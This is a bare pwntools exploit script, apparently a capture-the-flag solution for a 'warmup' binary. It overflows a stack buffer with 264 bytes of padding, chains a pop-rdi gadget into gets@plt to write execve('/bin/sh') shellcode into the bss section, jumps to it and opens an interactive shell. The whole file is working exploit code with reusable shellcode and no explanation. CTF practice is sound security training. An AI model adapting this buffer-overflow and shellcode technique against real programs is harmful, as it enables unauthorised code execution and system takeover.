from pwn import *

context.terminal =  ['tmux','split','-h']

r = process("./warmup")
#r = remote("nothing.chal.ctf.westerns.tokyo",  10001)
gdb.attach(proc.pidof(r)[0])




code = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = "A"*264

getsplt = 0x000000000400580

bss = 0x0000000000601089 + 0x20
poprdi = 0x0000000000400773

payload += p64(poprdi) + p64(bss) + p64(getsplt) + p64(bss)


s =  r.recvuntil("Please pwn me :)")
print s 
r.sendline(payload)


sleep(2)
r.sendline(code)


r.interactive()
